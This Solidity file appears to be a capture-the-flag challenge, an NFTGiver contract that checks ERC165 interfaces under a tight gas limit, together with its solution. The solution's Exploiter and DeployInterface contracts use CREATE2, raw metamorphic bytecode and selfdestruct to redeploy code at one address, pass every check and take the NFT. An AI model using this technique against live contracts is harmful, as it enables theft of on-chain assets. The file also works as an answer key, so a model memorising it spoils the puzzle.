//SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import '@openzeppelin/contracts/utils/introspection/ERC165.sol';
import '@openzeppelin/contracts/token/ERC721/ERC721.sol';

contract Award is ERC721 {
    constructor() ERC721('Award', 'A') {
        _mint(msg.sender, 1337);
    }
}

// NOTE
// The NFTGiver contract does not follow the ERC165 spec properly. It's supposed
// to consist of two calls, one to determine if it is ERC165, then the specific
// protocol. Don't copy this code for production applications.

contract NFTGiver {
    uint256 public constant GAS_LIMIT = 39;
    struct Game {
        bool success1;
        bool success2;
        bool success3;
        bool success4;
    }

    mapping(ERC165 => Game) private passedChallenge;
    bytes4 immutable ERC1155Reciever = 0x4e2312e0;
    bytes4 immutable ERC1363Reciever = 0x88a7ca5c;
    bytes4 immutable ERCRareReciever = 0x13371337;
    bytes4 immutable ERCBadReceiver = 0xdecafc0f;

    ERC721 private award;
    uint256[] private order;

    constructor(ERC721 awardNFT, uint256[] memory _order) {
        award = awardNFT;
        order = _order;
    }

    function _supportsInterface(ERC165 target, bytes4 _interface)
        public
        view
        returns (bool)
    {
        return target.supportsInterface{gas: GAS_LIMIT}(_interface);
    }

    function challenge1(ERC165 target) external {
        require(_supportsInterface(target, ERC1155Reciever));
        require(!_supportsInterface(target, ERC1363Reciever));
        require(!_supportsInterface(target, ERCRareReciever));
        require(!_supportsInterface(target, ERCBadReceiver));
        passedChallenge[target].success1 = true;

        require(order[order.length - 1] == 1);
        order.pop();
    }

    function challenge2(ERC165 target) external {
        require(!_supportsInterface(target, ERC1155Reciever));
        require(_supportsInterface(target, ERC1363Reciever));
        require(!_supportsInterface(target, ERCRareReciever));
        require(!_supportsInterface(target, ERCBadReceiver));

        require(order[order.length - 1] == 2);
        order.pop();

        passedChallenge[target].success2 = true;
    }

    function challenge3(ERC165 target) external {
        require(!_supportsInterface(target, ERC1155Reciever));
        require(!_supportsInterface(target, ERC1363Reciever));
        require(_supportsInterface(target, ERCRareReciever));
        require(!_supportsInterface(target, ERCBadReceiver));

        require(order[order.length - 1] == 3);
        order.pop();

        passedChallenge[target].success3 = true;
    }

    function challenge4(ERC165 target) external {
        require(!_supportsInterface(target, ERC1155Reciever));
        require(!_supportsInterface(target, ERC1363Reciever));
        require(!_supportsInterface(target, ERCRareReciever));
        require(_supportsInterface(target, ERCBadReceiver));

        require(order[order.length - 1] == 4);
        order.pop();

        passedChallenge[target].success4 = true;
    }

    function success(ERC165 target) external {
        require(passedChallenge[target].success1);
        require(passedChallenge[target].success2);
        require(passedChallenge[target].success3);
        require(passedChallenge[target].success4);

        delete passedChallenge[target];

        require(award.ownerOf(1337) == address(this));
        award.transferFrom(address(this), msg.sender, 1337);
    }
}



contract DeployInterface{
    address public tempContract;
    constructor(){
        // console.log(" --- DeployInterface::()# contract created");
    }

    function getImplementation() external view returns (address implementation) {
        return tempContract;
    }

    function deploy(bytes4 interfaceid) external returns (address){
        // address t = address(new InterfaceContract(interfaceid));
        address t ;
        // 60308060093d393df37f 4e2312e0 00000000000000000000000000000000000000000000000000000000 60043580602957ff5b143d52593df3%
        // bytes memory bytecode = abi.encodePacked(hex"60308060093d393df37f",interfaceid,hex"0000000000000000000000000000000000000000000000000000000060043580602957ff5b143d52593df3");
        // 60318060093d393df37f 4e2312e0 000000000000000000000000000000000000000000000000000000006004353461002f57143d52593df35bff%
        bytes memory bytecode = abi.encodePacked(hex"60318060093d393df37f",interfaceid,hex"000000000000000000000000000000000000000000000000000000006004353461002f57143d52593df35bff");

        // console.logBytes(bytecode);
        assembly {
            t := create2(
                callvalue(), // wei sent with current call
                // Actual code starts after skipping the first 32 bytes
                add(bytecode, 0x20),
                mload(bytecode), // Load the size of code contained in the first 32 bytes
                0 // Salt from function arguments
            )

            if iszero(extcodesize(t)) {
                revert(0, 0)
            }
        }
        // console.log(" --- DeployInterface::deploy()# temp",t);
        // ---------------------------

        tempContract = t ;
        address deployedTransientContract;
        bytes memory initCode = hex"5860208158601c335a63aaf10f428752fa158151803b80938091923cf3";

       /* solhint-disable no-inline-assembly */
        assembly {
            let encoded_data := add(0x20, initCode) // load initialization code.
            let encoded_size := mload(initCode)     // load the init code's length.
            deployedTransientContract := create2( // call CREATE2 with 4 arguments.
                0,                                    // do not forward any endowment.
                encoded_data,                         // pass in initialization code.
                encoded_size,                         // pass in init code's length.
                0                                  // pass in the salt value.
            )
        } /* solhint-enable no-inline-assembly */


        return deployedTransientContract;
    }

    function destroy() public {
        // console.log(" --- DeployInterface::~()# destroyed");
        selfdestruct(payable(msg.sender));
    }
}

interface InterfaceContract{
    function destroy() external payable;
}


contract Exploiter{
    address public _target;
    constructor(){
        // console.log(" --- Exploiter::()# created");
    }

    function execute(address victim,bytes4 funcSig,bytes4 ifceId,address award) external payable {
        // console.log("#############################################################");
        DeployInterface deployer = new DeployInterface{salt:0x0}();
        address target = deployer.deploy(ifceId);
        _target = target;
        // console.log("target ",target);
        // console.logBytes4(InterfaceContract(target).interfaceid());
        address(victim).call(abi.encodeWithSelector(funcSig,target));
        InterfaceContract(target).destroy{value:1000 gwei}();
        deployer.destroy();
    }

    function callSuccess(address victim,address award )external {
        // console.log("Exploiter::callSuccess# ",_target);
        NFTGiver(victim).success(ERC165(_target));
        // console.log("Exploiter::callSuccess# 1337 owner",Award(award).ownerOf(1337));
        Award(award).transferFrom(address(this), msg.sender, 1337);
    }
}
